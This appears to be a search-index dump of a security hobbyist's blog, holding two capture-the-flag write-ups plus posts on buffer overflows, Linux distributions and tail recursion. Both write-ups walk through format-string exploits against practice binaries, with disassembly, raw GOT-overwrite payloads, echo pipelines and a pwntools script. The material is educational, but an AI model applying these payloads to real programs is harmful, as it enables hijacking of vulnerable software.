\u0026lt;+20\u0026gt;: lea edx,[eax-0x1fb6] 0x0804925f \u0026lt;+26\u0026gt;: push edx 0x08049260 \u0026lt;+27\u0026gt;: mov ebx,eax 0x08049262 \u0026lt;+29\u0026gt;: call 0x8049070 \u0026lt;system@plt\u0026gt; 0x08049267 \u0026lt;+34\u0026gt;: add esp,0x10 0x0804926a \u0026lt;+37\u0026gt;: nop 0x0804926b \u0026lt;+38\u0026gt;: mov ebx,DWORD PTR [ebp-0x4] 0x0804926e \u0026lt;+41\u0026gt;: leave 0x0804926f \u0026lt;+42\u0026gt;: ret End of assembler dump. It seems like it\u0026rsquo;s executing a command stored in the edx pointer (since edx is pushed to the stack before the system() call) but we aren\u0026rsquo;t sure what exactly, but we can do a little trick to inspect what exactly is getting called.\nWe modify our eip to the start of the function flaggy.\n1 gef➤ set $eip=0x08049245 Then we can step a couple of instructions or set a breakpoint so we can get to the push edx instruction.\n1 2 gef➤ x/s $edx 0x804a04a: \u0026#34;cat flag.txt\u0026#34; Yep it is actually trying to cat our flag!\nOn checking the main() function we see that it just sets the buffers and jumps to some other function named response() which takes our input and prints it out using the vulnerable printf as we have just seen.\nHere is the disassembly for reference.\ngef➤ disas response Dump of assembler code for function response: 0x080491c2 \u0026lt;+0\u0026gt;: push ebp 0x080491c3 \u0026lt;+1\u0026gt;: mov ebp,esp 0x080491c5 \u0026lt;+3\u0026gt;: push ebx 0x080491c6 \u0026lt;+4\u0026gt;: sub esp,0x204 0x080491cc \u0026lt;+10\u0026gt;: call 0x8049100 \u0026lt;__x86.get_pc_thunk.bx\u0026gt; 0x080491d1 \u0026lt;+15\u0026gt;: add ebx,0x2e2f 0x080491d7 \u0026lt;+21\u0026gt;: sub esp,0xc 0x080491da \u0026lt;+24\u0026gt;: lea eax,[ebx-0x1ff8] 0x080491e0 \u0026lt;+30\u0026gt;: push eax 0x080491e1 \u0026lt;+31\u0026gt;: call 0x8049060 \u0026lt;puts@plt\u0026gt; 0x080491e6 \u0026lt;+36\u0026gt;: add esp,0x10 0x080491e9 \u0026lt;+39\u0026gt;: mov eax,DWORD PTR [ebx-0x8] 0x080491ef \u0026lt;+45\u0026gt;: mov eax,DWORD PTR [eax] 0x080491f1 \u0026lt;+47\u0026gt;: sub esp,0x4 0x080491f4 \u0026lt;+50\u0026gt;: push eax 0x080491f5 \u0026lt;+51\u0026gt;: push 0x200 0x080491fa \u0026lt;+56\u0026gt;: lea eax,[ebp-0x208] 0x08049200 \u0026lt;+62\u0026gt;: push eax 0x08049201 \u0026lt;+63\u0026gt;: call 0x8049040 \u0026lt;fgets@plt\u0026gt; 0x08049206 \u0026lt;+68\u0026gt;: add esp,0x10 0x08049209 \u0026lt;+71\u0026gt;: sub esp,0xc 0x0804920c \u0026lt;+74\u0026gt;: lea eax,[ebx-0x1fdd] 0x08049212 \u0026lt;+80\u0026gt;: push eax 0x08049213 \u0026lt;+81\u0026gt;: call 0x8049060 \u0026lt;puts@plt\u0026gt; 0x08049218 \u0026lt;+86\u0026gt;: add esp,0x10 0x0804921b \u0026lt;+89\u0026gt;: sub esp,0xc 0x0804921e \u0026lt;+92\u0026gt;: lea eax,[ebp-0x208] 0x08049224 \u0026lt;+98\u0026gt;: push eax 0x08049225 \u0026lt;+99\u0026gt;: call 0x8049030 \u0026lt;printf@plt\u0026gt; 0x0804922a \u0026lt;+104\u0026gt;: add esp,0x10 0x0804922d \u0026lt;+107\u0026gt;: sub esp,0xc 0x08049230 \u0026lt;+110\u0026gt;: lea eax,[ebx-0x1fcf] 0x08049236 \u0026lt;+116\u0026gt;: push eax 0x08049237 \u0026lt;+117\u0026gt;: call 0x8049060 \u0026lt;puts@plt\u0026gt; 0x0804923c \u0026lt;+122\u0026gt;: add esp,0x10 0x0804923f \u0026lt;+125\u0026gt;: nop 0x08049240 \u0026lt;+126\u0026gt;: mov ebx,DWORD PTR [ebp-0x4] 0x08049243 \u0026lt;+129\u0026gt;: leave 0x08049244 \u0026lt;+130\u0026gt;: ret End of assembler dump. Exploitation Plan Since we have a format string vulnerability, we can control the flow of our binary by altering any pointer we supply to the stack.\nWe also do have a target function which we want to call in order to cat our flag (flaggy).\nseems like everything is now connected! we can overwrite any libc call in our response() function with just the flaggy function.\nA good candidate is puts! Let\u0026rsquo;s find it\u0026rsquo;s GOT address in gdb.\ngef➤ got puts GOT protection: Partial RelRO | GOT functions: 8 [0x804c018] puts@GLIBC_2.0 → 0xf7e3e380 So our puts address in the global offset table is 0x804c018 which is actually a pointer to the actual libc puts.\nNow its time to get the address of the function we are overwriting the puts pointer with.\ngef➤ x flaggy 0x8049245 \u0026lt;flaggy\u0026gt;: 0x53e58955 The address of flaggy is 0x8049245.\nNow we have everything we need and it\u0026rsquo;s time to craft our exploit!\nCrafting the exploit 1. Doing it the hard way Let\u0026rsquo;s start with crafting our exploit without using any scripts or fancy tools.\nHere is the info we have gathered so far.\nprintf entry that we control is at index 4 puts pointer address: 0x804c018z flaggy function address: 0x8049245 our payload will be as follows:\npointer data to be written the write specifier\nwhich is equivalent to the following:\n0x804c018 %(0x8049245 - 4)x %4$n\nconvert puts address to little endian and equate the integer value of (0x8049245 - 4)\n\\x18\\xc0\\x04\\x08 %134517313x %4$n but on using this payload we literally write 134517313 blank characters to stdout which is going to take ~2 mins everytime we are trying to execute the payload.\nThis makes it pretty damn hard to test and debug our payload, but the good news is we can use an alternate faster method using short writes (2-bytes write) instead of an integer write (4-byte write).\nInstead of directly writing to the puts pointer 0x804c018 we can write two bytes 0x804 to the upper nibbe of the pointer 0x804c018 + 2 and another two bytes 0x9245 to the lower nibble of the pointer 0x804c018.\nDon\u0026rsquo;t forget that we need to subtract the amount of charcters written so far from each write we do.\nHere is the payload:\n0x804c018+2 0x804c018 %(0x804-8)x %4$n %(0x9245-0x804)x %5$n\nWe will convert the first two addresses to little endian and the second two addresses to their integer equivalent.\n\\x1a\\xc0\\x04\\x08 \\x18\\xc0\\x04\\x08 %2044x %4$hn %35393x %5$hn\nAnd we can use echo with the -e flag to pass it to our binary escaping the \u0026ldquo;$\u0026rdquo; using a forward slash.\n1 echo -e \u0026#34;\\x1a\\xc0\\x04\\x08\\x18\\xc0\\x04\\x08%2044x%4\\$hn%35393x%5\\$hn\u0026#34; | ./trigger_happy And we get our flag!\n2. Using pwntools to craft our exploit. Here is how I built the same exploit using python and pwntools.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 from pwn import * OFFSET = 4 elf = ELF(\u0026#39;./trigger_happy\u0026#39;) if args[\u0026#39;REMOTE\u0026#39;]: io = remote(\u0026#39;ctf.0xl4ugh.com\u0026#39;, 1337) else: io = process(\u0026#39;./trigger_happy\u0026#39;) puts = elf.got[\u0026#39;puts\u0026#39;] win = elf.symbols[\u0026#39;flaggy\u0026#39;] payload = fmtstr_payload(OFFSET, {puts: win}, write_size=\u0026#39;byte\u0026#39;) def run(): print(io.readlineS()) io.sendline(payload) print(io.recvallS()) if __name__ == \u0026#39;__main__\u0026#39;: run() ","description":"This is a challenge from 0xl4ugh CTF which was inspired by RACTF's not really ai challenge.","id":21,"section":"writeups","tags":["pwn"],"title":"Trigger Happy - 0xL4ugh CTF","uri":"https://hegzploit.github.io/writeups/trigger-happy/"},{"content":"\nWhat is a Buffer anyway? We can think of buffers as containers to hold our data for later use, it\u0026rsquo;s not really something specific to computer science; In fact, we have buffers in electronics, mechanics, chemistry and even politics!\nWe can say that the word buffer is just a fancy name for a placeholder (temporary storage)!\nBuffer in Computer Science Now, it\u0026rsquo;s time to get more technical and get to know buffers more in computer science!\nOnline video streaming is a pretty good application of buffering, back in the old days we would see YouTube showing that nostalgic loading bar while waiting the video to load and that\u0026rsquo;s exactly why we use buffers!\nWe need to store video data in someplace so that when we need that data we can load it directly from the computer\u0026rsquo;s memory since we can\u0026rsquo;t really have our internet connection playback videos in realtime without having some temporarily storage for data to reside in, and that\u0026rsquo;s the reason why livestreams never sync with realtime and have a couple seconds delay.\nhere is a more lower level representation of a buffer:\n1 2 3 4 5 6 7 #define BUFSIZE 1024 char buffer[BUFSIZE]; size_t len; // ... later while((len=read(STDIN, \u0026amp;buffer, BUFSIZE)) \u0026gt; 0) write(STDOUT, buffer, len); This snippet basically check for data available then reads it from the standard input (command line) and writes that data back to the standard output (command line too).\nBuffer Overflows! It\u0026rsquo;s time for the good stuff now!\nLet\u0026rsquo;s say we have an arbitrary variable of size 5 bytes, and we stored some value in that variable which exceeds 5 bytes, that\u0026rsquo;s a simple buffer overflow!\n1 2 3 4 5 6 char someVariable[5]; /* we are trying to copy 15 bytes to a 5 bytes sized variable */ memcpy(someVariable, \u0026#34;Hello, world!\\n\u0026#34;, 15); printf(someVariable); We encounter buffer overflows more frequently than we imagine, ever seen Segmentation Fault appear in your C program out of nowhere? That\u0026rsquo;s also a buffer overflow but your computer has prevented it from causing any damage and stopped the program from running.\nLet\u0026rsquo;s get back to our 5 bytes overflown variable example. What happens to the overflown data? Where is it\u0026rsquo;s destination? Does it get lost in the void of nothingness?\nNope, in fact we just overwrite other data when we overflow any variable, and that\u0026rsquo;s the core of our problem. We can\u0026rsquo;t just overwrite data and act as if nothing happened. What if we overwrite important data? What if we can overwrite data related to process memory and already running programs?\nThese are all possibilities which are just a mere consequence of buffer overflows and can cause great damage to computers\nWeaponizing Buffer Overflows A basic technique used by hackers when exploiting buffer overflow vulnerabilities is determining the place where data gets overwritten and handcrafting the overflown data to inject arbitrary code in the program, imagine if that program runs at elevated privileges and a hacker takes control of it\u0026rsquo;s execution flow, you get pwned.\nAnd that\u0026rsquo;s just the basic technique in abusing buffer overflow vulnerabilities.\nAm I Really Safe? Sadly, yes you are safe.\nBuffer overflows aren\u0026rsquo;t as popular in 2020 (as of writing this article) as they used to be back in the old days of computers, all modern processors/operating systems have strict rules and mitigations for all the paradigms and techniques of buffer overflows.\nSome of these famous mitigations are:\nASLR (Address Space Layout Randomization)\nBasically randomizes all the memory addresses at runtime whenever you execute any program so it makes it impossible to hardcode memory addresses for exploiting buffer overflow attacks\ni.e: the exploit needs to be completely dynamic\nNX Bit\nBasically marks areas of memory as non-executable, prevents hackers from injecting malicious code into areas of memory in an attempt to execute it.\nStack Canaries\nBasically generates some random value in memory at runtime and checks before returning from any function if that random value got overwritten or not, if yes then program exits.\nAnd these are just some of the basic mitigation used in 2020.\nBut again, these doesn\u0026rsquo;t really make your computer invincible as much as making it just harder for an attacker to compromise your system using buffer overflow attacks.\nHackers still can bypass these mitigations using underhanded methods such as bruteforce and leaking addresses from memory but using these mitigations correctly can make buffer overflows nearly useless.\nIt\u0026rsquo;s also worthy to mention that buffer overflows can be prevented from the programmers side by following the coding best practices and avoiding unsanitized input etc\u0026hellip;\n","description":"A basic introduction to buffer overflows to people who haven't heard about it before.","id":22,"section":"posts","tags":null,"title":"Buffer Overflows for Newbies","uri":"https://hegzploit.github.io/posts/bof-for-normies/"},{"content":"Now, that\u0026rsquo;s a bit misleading since i have been using windows for the past 12-13 years of my keyboard smashing journey but i don\u0026rsquo;t really feel any guilt doing this, in fact windows is nothing more of a bottleneck to me or so have i figured later.\nenough ranting, maybe this needs it\u0026rsquo;s own blog post after all or maybe not, it\u0026rsquo;s a highly controversial topic whatsoever. Just believe me windows is pure evil.\nSettling on an OS I have tried tons of Linux distrois but i always kept jumping from one to the next, never settled on a distro, at first i wanted to use it mainly for my cybersecurity hobby so i thought Kali would be a pretty nice choice\u0026hellip;\nbut guess what, it wasn\u0026rsquo;t\u0026hellip;\nI really think that kali is a pretty good OS but not that good for using as a daily driver system, it\u0026rsquo;s just bloated with a tons of security tools that you will never get chance to use and maybe you don\u0026rsquo;t even know of their existence.\nso i started trying different operating systems ranging from the classic debian to using arch linux which actually was the thing i liked the most!\nWhy Arch beside the fact that you get to customize your operating system to the max level, you also get the Arch User Repository (AUR) which contains 64,441 packages as of writing this, it\u0026rsquo;s a rolling release distro which basically gives you gradual little updates as they are released unlike other stable release distro that give you a bulky big update that sometimes forces you to reinstall your os.\nArch is a bit tougher than any other OS though, since they don\u0026rsquo;t provide any graphical installer like most distros and you have to configure it yourself from the groundup, a pretty awesome arch based distro is Manjaro which is bascially a simpified version of arch with all Arch\u0026rsquo;s perks and that\u0026rsquo;s what i have setteled on!\nManjaro for Cybersecurity So we now have an arch distro that is lightweigt, fully customizable and contains an awesome package manager with the arch user repositoty, and that\u0026rsquo;s not even the end! we can add to our manjaro setup the blackarch repo which contains as of writing this article a whooping 7030 security tool ready for installing at your fingertips!\nnow we can customize our own distro and bundle it with the tools we only need!\nThe Sky\u0026rsquo;s your limit Manjaro comes in differnt desktop enviroments, but i have actually tried all of them inclduing XFCE, KDE and MATE and the one that sucked the least was XFCE\u0026hellip;\nbut that was until i discovered the heaven of tiling window managers, which basically can speed up your keyboard smashing habits by 10x if you invested the little time into making it your own!\nhere are some pics of my Manjaro boxes!\nconfig\nconfig\n","description":"Since a couple months ago, I have decided to try and switch fully to linux and ditch that piece of junk they call windows.","id":23,"section":"posts","tags":["linux"],"title":"My Favorite Linux Distro","uri":"https://hegzploit.github.io/posts/distro/"},{"content":"In this blog post i will try to explain the basic concept of recursion and then show why recursion can be so inefficient and how to optimize it using Call Tail Optimization!\nNormal Recursion, A Factorial Example Most of us tech nerds have already dealt with the good \u0026lsquo;ol recursion, let\u0026rsquo;s refresh our understanding using the iconic factorial program.\n$$0! = 1$$\n$$n! = n (n-1)!$$\nPython Implementation:\n1 2 3 4 5 def fact(x): if (x==0): return 1 else: return x * fact(x-1) But python is just too mainstream and overrated, let\u0026rsquo;s use Lisp!\n1 2 3 4 (define (fact x) (if (= x 0) 1 (* x (fact (- x 1))))) ain\u0026rsquo;t Scheme just too beautiful?\nNow, let\u0026rsquo;s inspect the program behavior!\nTracing The Recursion let\u0026rsquo;s say we want to execute (fact 5) which supposedly evaluates to 120.\nhere is the trace of the factorial operation:\n1 2 3 4 5 6 7 8 9 10 11 12 (fact 5) (* 5 (fact 4)) (* 5 (* 4 (fact 3))) (* 5 (* 4 (* 3 (fact 2)))) (* 5 (* 4 (* 3 (* 2 (fact 1))))) (* 5 (* 4 (* 3 (* 2 (* 1 (fact 0)))))) (* 5 (* 4 (* 3 (* 2 (* 1 1))))) (* 5 (* 4 (* 3 (* 2 1)))) (* 5 (* 4 (* 3 2))) (* 5 (* 4 6)) (* 5 24) 120 here\u0026rsquo;s the pythonic version for those who are struggling with lisp (it\u0026rsquo;s way easier believe me)\n1 2 3 4 5 6 7 8 9 10 11 12 fact(5) 5 * fact(4) 5 * (4 * fact(3)) 5 * (4 * (3 * fact(2))) 5 * (4 * (3 * (2 * fact(1)))) 5 * (4 * (3 * (2 * (1 * fact(0))))) 5 * (4 * (3 * (2 * (1 * 1)))) 5 * (4 * (3 * (2 * 1))) 5 * (4 * (3 * 2)) 5 * (4 * 6) 5 * 24 120 Did you figure out the flaw of our simple recursion implementation yet?\nIt\u0026rsquo;s pretty simple, the way we expand the factorial on each iteration so that it grows and keeps growing until we fully expand it is just so inefficient and wastes memory space.\nThe waste of memory space comes from the fact that each call of (fact x) will allocate a new stack frame to store its data, so we have used around 6 stack frames for this simple calculation, allocating and popping stack frames is a relatively intensive operation for the CPU.\nThe source of this flaw is the multiplication that we are performing with our recurred call.\nSo Tail Call Optimization or Tail Recursion are just fancy names for a simple rule we need to follow in order to optimize our recursive functions.\n\u0026ldquo;The recurred call shouldn\u0026rsquo;t be combined with other operations\u0026rdquo;\ni.e: we need to move the multiplication operator out of the recurred call in the factorial function\nUsing Tail Recursion let\u0026rsquo;s rewrite the factorial function in Tail Recursion:\n1 2 3 4 5 (define (fact-tail x accum) (if (= x 0) accum (fact-tail (- x 1) (* x accum)))) (define (fact x) (fact-tail x 1)) Pythonic version: 1 2 3 4 5 6 7 def factTail(x, accum): if (x == 0): return accum else: return factTail(x-1, x*accum) def fact(x): return factTail(x, 1) what we did in that snippet above is pretty simple, we just split the work across two functions, the first function (fact-tail x accum) will iterate and the second function (fact x) will call the first function and returns the value of each iteration (we have also moved the multiplication operation to it\u0026rsquo;s own variable) so we basically have no extra operations going on, in fact calling (fact 0) is now the same as calling (fact 10000) in terms of memory size.\nlet\u0026rsquo;s step through each iteration and see for ourselves how great is Tail Recursion:\n1 2 3 4 5 6 7 8 (fact 5) (fact-tail 5 1) (fact-tail 4 5) (fact-tail 3 20) (fact-tail 2 60) (fact-tail 1 120) (fact-tail 0 120) 120 Pythonic Version:\n1 2 3 4 5 6 7 fact(5) factTail(5, 1) factTail(4, 5) factTail(3, 20) factTail(2, 60) factTail(1, 120) factTail(0, 120) is this even recursion anymore, that\u0026rsquo;s just fancy iteration!\nwe have used recursion in such a way that we store all the data to perform our evalutaion in each individual reccured call!\nAll Hail Tail Call Optimization!\nMore Tail Recursion! here is one more example with the infamous fibonacci function in both normal Recursion and then Tail Recursion:\n(you try to implement it in python this time :p)\nNormal Recursion 1 2 3 4 (define (fib x) (cond ((= x 0) 0) ((= x 1) 1) (else (+ (fib (- x 1)) (fib (- x 2)))))) Tail Recursion 1 2 3 4 5 6 7 (define (fib x) (fib-iter x 0 1)) (define (fib-iter x a b) (cond ((= x 0) a) ((= x 1) b) (else (fib-iter (- x 1) b (+ a b))))) All Hail The Tail Recursion\n","description":"Recursion is a pretty improtant topic in programming and it's not that hard to grasp or even implement, but how about actually using it correctly?","id":24,"section":"posts","tags":null,"title":"Optimizing Recursion","uri":"https://hegzploit.github.io/posts/recursion/"},{"content":" Misusage of the libc printf() function can lead to serious information leakage and even code execution. when we pass one argument (for example printf(foo)) we can: leak stack addresses using %x or %p format specifiers. overwrite any pointer\u0026rsquo;s value using %n specifier (note that we can\u0026rsquo;t overwrite plain stack addresses as the %n format specifier can only overwrite by reference and not by value) For more information on format strings please check this awesome resource\nAnalyzing the Binary we fire up GDB and list all our functions:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 gef➤ info functions All defined functions: Non-debugging symbols: 0x08049000 _init 0x08049030 printf@plt 0x08049040 fgets@plt 0x08049050 getegid@plt 0x08049060 puts@plt 0x08049070 system@plt 0x08049080 __libc_start_main@plt 0x08049090 setvbuf@plt 0x080490a0 setresgid@plt 0x080490b0 _start 0x080490f0 _dl_relocate_static_pie 0x08049100 __x86.get_pc_thunk.bx 0x08049110 deregister_tm_clones 0x08049150 register_tm_clones 0x08049190 __do_global_dtors_aux 0x080491c0 frame_dummy 0x080491c2 response 0x08049245 flaggy 0x08049270 main 0x080492eb __x86.get_pc_thunk.ax 0x080492f0 __libc_csu_init 0x08049350 __libc_csu_fini 0x08049351 __x86.get_pc_thunk.bp 0x08049358 _fini we notice three non-standard functions above which are:\n1 2 3 0x080491c2 response 0x08049245 flaggy 0x08049270 main by inspecting the disassembly for these three functions we find out that:\nmain function will call response function response function maybe vulnerable to a format string vulnerability (since there is a printf call) the flaggy function is a dead code, our goal is to call it. so let\u0026rsquo;s start by running some input on the binary, let\u0026rsquo;s test with a couple of %x\u0026rsquo;s:\nhegz@hegzbox:~/ractf/Not_Really_AI$ ./nra How are you finding RACTF? %x %x %x %x I am glad you 200 f7fb9580 80491d1 25207825 We hope you keep going! bingo!\nwe can leak stack addresses.\nExploitation since this binary is vulnerable to a format strings attack, we can use the %n specifer to overwrite any pointer value on the stack.\nBut can we really overwrite the return address?\nThe answer is No, we can\u0026rsquo;t do that since it is not a pointer, it\u0026rsquo;s a value and we can\u0026rsquo;t overwrite values on the stack using %n\nOur approach to this challenge will be through overwriting the \u0026ldquo;Global Offset Table\u0026rdquo;\u0026hellip;\nto put it simply, the Global Offset Table is somewhere in the bss section of the binary where shared library functions are mapped to their addresses.\nIf we can overwrite one of these function addresses (for example puts() GOT address) then, when we want to execute this function (the puts) it will instead execute our arbitary function.\nwe check our vulnrable function for candiadtes:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 gef➤ disas response Dump of assembler code for function response: 0x080491c2 \u0026lt;+0\u0026gt;: push ebp 0x080491c3 \u0026lt;+1\u0026gt;: mov ebp,esp 0x080491c5 \u0026lt;+3\u0026gt;: push ebx 0x080491c6 \u0026lt;+4\u0026gt;: sub esp,0x204 0x080491cc \u0026lt;+10\u0026gt;: call 0x8049100 \u0026lt;__x86.get_pc_thunk.bx\u0026gt; 0x080491d1 \u0026lt;+15\u0026gt;: add ebx,0x2e2f 0x080491d7 \u0026lt;+21\u0026gt;: sub esp,0xc 0x080491da \u0026lt;+24\u0026gt;: lea eax,[ebx-0x1ff8] 0x080491e0 \u0026lt;+30\u0026gt;: push eax 0x080491e1 \u0026lt;+31\u0026gt;: call 0x8049060 \u0026lt;puts@plt\u0026gt; 0x080491e6 \u0026lt;+36\u0026gt;: add esp,0x10 0x080491e9 \u0026lt;+39\u0026gt;: mov eax,DWORD PTR [ebx-0x8] 0x080491ef \u0026lt;+45\u0026gt;: mov eax,DWORD PTR [eax] 0x080491f1 \u0026lt;+47\u0026gt;: sub esp,0x4 0x080491f4 \u0026lt;+50\u0026gt;: push eax 0x080491f5 \u0026lt;+51\u0026gt;: push 0x200 0x080491fa \u0026lt;+56\u0026gt;: lea eax,[ebp-0x208] 0x08049200 \u0026lt;+62\u0026gt;: push eax 0x08049201 \u0026lt;+63\u0026gt;: call 0x8049040 \u0026lt;fgets@plt\u0026gt; 0x08049206 \u0026lt;+68\u0026gt;: add esp,0x10 0x08049209 \u0026lt;+71\u0026gt;: sub esp,0xc 0x0804920c \u0026lt;+74\u0026gt;: lea eax,[ebx-0x1fdd] 0x08049212 \u0026lt;+80\u0026gt;: push eax 0x08049213 \u0026lt;+81\u0026gt;: call 0x8049060 \u0026lt;puts@plt\u0026gt; 0x08049218 \u0026lt;+86\u0026gt;: add esp,0x10 0x0804921b \u0026lt;+89\u0026gt;: sub esp,0xc 0x0804921e \u0026lt;+92\u0026gt;: lea eax,[ebp-0x208] 0x08049224 \u0026lt;+98\u0026gt;: push eax 0x08049225 \u0026lt;+99\u0026gt;: call 0x8049030 \u0026lt;printf@plt\u0026gt; 0x0804922a \u0026lt;+104\u0026gt;: add esp,0x10 0x0804922d \u0026lt;+107\u0026gt;: sub esp,0xc 0x08049230 \u0026lt;+110\u0026gt;: lea eax,[ebx-0x1fcf] 0x08049236 \u0026lt;+116\u0026gt;: push eax 0x08049237 \u0026lt;+117\u0026gt;: call 0x8049060 \u0026lt;puts@plt\u0026gt; 0x0804923c \u0026lt;+122\u0026gt;: add esp,0x10 0x0804923f \u0026lt;+125\u0026gt;: nop 0x08049240 \u0026lt;+126\u0026gt;: mov ebx,DWORD PTR [ebp-0x4] 0x08049243 \u0026lt;+129\u0026gt;: leave 0x08049244 \u0026lt;+130\u0026gt;: ret End of assembler dump. we see a puts call after the vulnerable printf function, that\u0026rsquo;s our candiadte.\nAlright, now it\u0026rsquo;s time to collect all the pieces of the puzzle.\nIn order to start writing our exploit, we will need two pieces of information:\nThe memory address we are overwriting \u0026ndash;\u0026gt; puts GOT address The memory address we are overwriting with \u0026ndash;\u0026gt; flaggy to get the puts GOT address we can disassemble the puts address located at response\u0026lt;+117\u0026gt;:\n1 2 3 4 5 6 gef➤ disas 0x8049060 Dump of assembler code for function puts@plt: 0x08049060 \u0026lt;+0\u0026gt;: jmp DWORD PTR ds:0x804c018 0x08049066 \u0026lt;+6\u0026gt;: push 0x18 0x0804906b \u0026lt;+11\u0026gt;: jmp 0x8049020 End of assembler dump. then we examine the destination address of the jump instrcution above to make sure its the GOT address:\n1 2 gef➤ x 0x804c018 0x804c018 \u0026lt;puts@got.plt\u0026gt;: 0x08049066 and voila, 0x804c018 is our desired address!\nnow we need the flaggy function address:\n1 2 gef➤ x flaggy 0x8049245 \u0026lt;flaggy\u0026gt;: 0x53e58955 and our address is 0x8049245\n(note: don\u0026rsquo;t confuse the address with its value, i.e: in the above snippet we have two hex numbers where 0x8049245 is the address/pointer and 0x53e58955 is the value of that pointer/address)\nTime to write our Exploit! our exploit will look like this (Abstracted):\n[Address_of_puts][Address_of_flaggy][Address_of_puts entry number on the stack]\nlet\u0026rsquo;s dig a bit deeper into each of these parts:\n[Address_of_puts]:\nthis is the simplest of the three, and it\u0026rsquo;s basically our GOT puts address which we obtained above, but encoded in little endian Address_of_puts = \\x18\\xc0\\x04\\x08 [Address_of_flaggy]:\nif we recall back, we mentioned that the %n specifier will write the printed character length to a specified pointer.\nour goal here is to encode the Address of flaggy function as a padded address, for example we want to encode this address 0x8049245\nthe format will be: %(integer value of the address - 4)x where the 4 is the length of the [Address_of_puts]\nusing any calculator or just python, we can calculate the integer value of any hex address: 1 2 \u0026gt;\u0026gt;\u0026gt; int(0x8049245 - 4) 134517313 so our final payload will be: %134517313x\n[Address_of_puts entry number on the stack]:\nto calculate the offset of puts in our printf stack leak, we use an Egg i.e: AAAA, and follow it with some %x\u0026rsquo;s until we can locate it\u0026rsquo;s offset. hegz@hegzbox:~/ractf/Not_Really_AI$ ./nra How are you finding RACTF? AAAA %x %x %x %x %x %x %x %x I am glad you AAAA 200 f7fb9580 80491d1 41414141 20782520 25207825 78252078 20782520 we see that our offset is the 4th entry after the egg, so our payload will be: %x %x %x %n or we can use the special feautre of printf %4$n which does the same thing.\nfull payload:\n\\x18\\xc0\\x04\\x08%134517313x%4$n\nwe will use echo to print and pipe it to the binary (we also escape the $ and append a \\x0a for a newline):\necho -en \\x18\\xc0\\x04\\x08%134517313x%4\\\\$n\\x0a | ./nra\na lot of blank spaces will be printed, and eventually our flag\u0026hellip;\nractf{f0rmat_Str1nG_fuN}\n","description":"This is a Binary exploitaion challenge, based around a format string vulnerability.","id":25,"section":"writeups","tags":["pwn"],"title":"Not Really AI - RA CTF","uri":"https://hegzploit.github.io/writeups/notreallyai/"}]